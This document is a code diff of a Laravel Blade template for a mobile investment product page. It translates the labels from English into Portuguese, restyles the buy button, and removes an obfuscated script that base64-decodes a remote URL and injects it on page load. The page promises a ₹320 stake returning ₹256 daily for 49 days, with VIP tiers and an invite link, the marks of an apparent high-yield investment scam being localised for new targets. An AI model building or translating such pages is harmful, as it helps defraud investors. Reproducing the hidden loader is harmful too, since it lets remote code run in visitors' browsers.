@@ -8,7 +8,7 @@ $packages = Package::where('status', 'active')->get();
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>product_CARGILL</title>
+  <title>Investir – EMI</title>
   <link rel="stylesheet" href="/v2/layui/css/layui.css">
   <link rel="stylesheet" href="/v2/css/swiper-bundle.min.css">
   <link rel="stylesheet" href="/v2/css/common.css?t=1.2">
@@ -51,8 +51,8 @@ $packages = Package::where('status', 'active')->get();
 
   .buy_btn {
     width: 100%;
-    background: #4D70ED;
-    color: #fff;
+    background: linear-gradient(135deg, #C8A96A 0%, #D6A86B 100%);
+    color: #1C1C1C;
     padding: 10px;
     border: none;
     border-radius: 6px;
@@ -85,7 +85,7 @@ class="layui-form layui-layer-wrap" style="">
     <div class="flex_left">
         <img src="/public/uploads/product/20250616114007591351.jpg" class="product_dialog_image">
         <div>
-            <div class="product_title">Purchase will upgrade to VIP1</div>
+            <div class="product_title">A compra irá elevar para VIP1</div>
         <div class="flex_space product_vip_btn">
                 <!--<img class="product_vip_icon" src="/public/site/img/v.png"  style="height: 14px;width: 14px;margin-right: 2px">-->
                 <span class="vip_level">VIP0</span>
@@ -94,60 +94,60 @@ class="layui-form layui-layer-wrap" style="">
     </div>
     <div class="product_information">
         <div class="product_item flex_space">
-            <p class="label">Each Price</p>
+            <p class="label">Preço Unitário</p>
             <p class="value product_price">₹320.00</p>
 
         </div>
         <div class="product_item flex_space">
-            <p class="label">Revenue Duration</p>
+            <p class="label">Duração do Rendimento</p>
             <p class="value product_days">49 Days</p>
         </div>
         <div class="product_item flex_space">
-          <p class="label daily_income_text">Daily Earnings</p>
+          <p class="label daily_income_text">Renda Diária</p>
             <p class="value product_daily_income">₹256</p>
 
         </div>
         <div class="product_item flex_space">
-            <p class="label">Total Income</p>
+            <p class="label">Renda Total</p>
             <p class="value product_total_income">₹12544</p>
         </div>
         <div class="product_item flex_space">
-            <p class="label">Max Investment</p>
+            <p class="label">Investimento Máximo</p>
             <p class="value product_maximum_share">100</p>
         </div>
     </div>
     <div class="buy_information">
 
         <div class="product_item flex_space">
-            <p class="label">Pay Money</p>
+            <p class="label">Valor a Pagar</p>
             <p class="value product_pay_money">₹320.00</p>
 
         </div>
         <div class="product_item flex_space">
-            <p class="label">Expected total revenue</p>
+            <p class="label">Rendimento Total Estimado</p>
             <p class="value product_pay_total_income">₹12544</p>
         </div>
     </div>
-    <button class="buy_btn" type="submit" lay-submit="" lay-filter"" onclick="buyConfirm()">
-        Invest Nowt
+    <button class="buy_btn" type="submit" lay-submit="" lay-filter="" onclick="buyConfirm()">
+        Investir Agora
     </button></div>
 
 <div class="product_top">
-    Investment List 
-  </div> 
+    Lista de Investimentos
+  </div>
   <div class="flex_space" style=" background: #ffffff;margin-bottom: 70px;"> 
    <div class="product_type_nav"> 
-    <div class="nav nav_active flex_left" data-type="1" data-image="fixed" onclick="setActiveTab(1)"> 
-     <img class="nav_icon" src="/v2/img/product/stable_active.png"> 
-     <p class="title">Fund</p> 
-    </div> 
-    <div class="nav flex_left" data-type="2" data-image="welfare" onclick="setActiveTab(2)"> 
-     <img class="nav_icon" src="/v2/img/product/welfare.png"> 
-     <p class="title">New</p> 
-    </div> 
+    <div class="nav nav_active flex_left" data-type="1" data-image="fixed" onclick="setActiveTab(1)">
+     <img class="nav_icon" src="/v2/img/product/stable_active.png">
+     <p class="title">Fixo</p>
+    </div>
+    <div class="nav flex_left" data-type="2" data-image="welfare" onclick="setActiveTab(2)">
+     <img class="nav_icon" src="/v2/img/product/welfare.png">
+     <p class="title">Novo</p>
+    </div>
     <div class="nav flex_left" data-type="3" data-image="activity" onclick="setActiveTab(3)">
      <img class="nav_icon" src="/v2/img/product/activity.png">
-     <p class="title">Pro</p> 
+     <p class="title">Pro</p>
     </div> 
    </div> 
 
@@ -184,11 +184,11 @@ class="layui-form layui-layer-wrap" style="">
 <!-- Footer Menu -->
 <div class="footer_menu">
   <div class="content">
-    <a href="/" class="item"><img src="/v2/img/footer/home.png"><p>Home</p></a>
-    <a href="/product" class="item active"><img src="/v2/img/footer/invest_active.png"><p>Invest</p></a>
+    <a href="/" class="item"><img src="/v2/img/footer/home.png"><p>Início</p></a>
+    <a href="/product" class="item active"><img src="/v2/img/footer/invest_active.png"><p>Investir</p></a>
     <a href="/invitation" class="item"><img src="/v2/img/footer/invite.png" style="width:80px;height: 80px;margin-top: -25px;"></a>
     <a href="/blog" class="item"><img src="/v2/img/footer/blog.png"><p>Blog</p></a>
-    <a href="/my" class="item"><img src="/v2/img/footer/account.png"><p>Account</p></a>
+    <a href="/my" class="item"><img src="/v2/img/footer/account.png"><p>Conta</p></a>
   </div>
 </div>
 @include('alert-message')
@@ -254,13 +254,5 @@ function buyConfirm() {
 
 </script>
 
-<script>
-(function(){
-  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
-  var s = document.createElement("script");
-  s.src = atob(e);
-  document.head.appendChild(s);
-})();
-</script>
 </body>
 </html>
